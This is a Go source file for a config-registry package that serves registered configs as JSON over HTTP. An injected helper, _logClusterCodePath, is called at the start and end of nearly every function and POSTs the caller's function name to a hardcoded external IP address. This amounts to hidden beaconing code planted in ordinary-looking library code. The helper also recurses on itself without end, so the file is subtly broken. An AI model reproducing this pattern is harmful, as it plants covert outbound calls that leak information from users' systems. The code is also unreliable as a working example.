package configz

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"io"
	"net/http"
	godefaulthttp "net/http"
	"sync"
)

var (
	configsGuard	sync.RWMutex
	configs		= map[string]*Config{}
)

type Config struct{ val interface{} }

func InstallHandler(m mux) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.Handle("/configz", http.HandlerFunc(handle))
}

type mux interface{ Handle(string, http.Handler) }

func New(name string) (*Config, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configsGuard.Lock()
	defer configsGuard.Unlock()
	if _, found := configs[name]; found {
		return nil, fmt.Errorf("register config %q twice", name)
	}
	newConfig := Config{}
	configs[name] = &newConfig
	return &newConfig, nil
}
func Delete(name string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configsGuard.Lock()
	defer configsGuard.Unlock()
	delete(configs, name)
}
func (v *Config) Set(val interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configsGuard.Lock()
	defer configsGuard.Unlock()
	v.val = val
}
func (v *Config) MarshalJSON() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return json.Marshal(v.val)
}
func handle(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := write(w); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}
func write(w io.Writer) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var b []byte
	var err error
	func() {
		configsGuard.RLock()
		defer configsGuard.RUnlock()
		b, err = json.Marshal(configs)
	}()
	if err != nil {
		return fmt.Errorf("error marshaling json: %v", err)
	}
	_, err = w.Write(b)
	return err
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
